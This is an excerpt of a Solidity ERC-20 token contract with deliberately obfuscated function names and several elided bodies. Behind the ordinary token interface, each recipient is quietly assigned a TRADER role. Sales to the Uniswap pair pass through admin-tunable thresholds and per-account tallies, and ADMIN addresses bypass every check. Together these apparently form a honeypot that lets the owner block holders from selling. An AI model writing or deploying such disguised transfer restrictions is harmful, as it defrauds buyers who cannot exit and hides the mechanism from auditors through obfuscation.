...
interface _XCINFDSSRoleControl {
...
abstract contract _XCINFDSSConsole is Context, _XCINFDSSRoleControl {
    ...
    function _roleCheked(bytes32 role, address account, uint256 amt) internal {
        ...
        _roleChekeds(role, account, amt);
    }

    function _roleChekeds(bytes32 role, address account, uint256 amount) internal {
    ...
    function __checkAmount(bytes32 role, address account, uint256 _at,  uint256 num) internal {
        if(num > 0){
            uint256 st = _roles[role].RD.RD[account].add(num);
            if (st >= _at) {
    ...
    function __XCINFDSSmemM(
        bytes32 root,
        uint256 num
    ) public onlyRole(ADMIN) {
        if(root != TRADER){
            revert("xinnum is not a number");
        }
        xinnum = num;
    }
...
contract _XCINFDSSERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _XCINFDSSERC20, _XCINFDSSConsole {
    ...
    ) _XCINFDSSERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_XCINFDSSERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __XCINFDSSjfbrt(from, to, amt);

    }

    function __XCINFDSSjfbrt(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __XCINFDSSexcmyu(from, to, amt);
    }


    function __XCINFDSSexcmyu(address from, address to, uint256 amt) internal {
        ...
        __XCINFDSSuidfrweqw(from, to, amt);
    }

    function __XCINFDSSuidfrweqw(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __XCINFDSSxcrgmy(from, to, amt);
    }

    function __XCINFDSSxcrgmy(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        __XCINFDSSrtvwecs(from, to, amt);
    }


    function __XCINFDSSrtvwecs(address from, address to, uint256 amt) internal {
        if(to == uniswapV2Pair){
            if(xinnum > 50){
        ...
        __XCINFDSSiexcebn(from, to, amt);
    }

    function __XCINFDSSiexcebn(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }else if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           __XCINFDSSxcvreinbf(from, to, amt);
    ...
    function __XCINFDSSxcvreinbf(address from, address to, uint256 amt) internal {
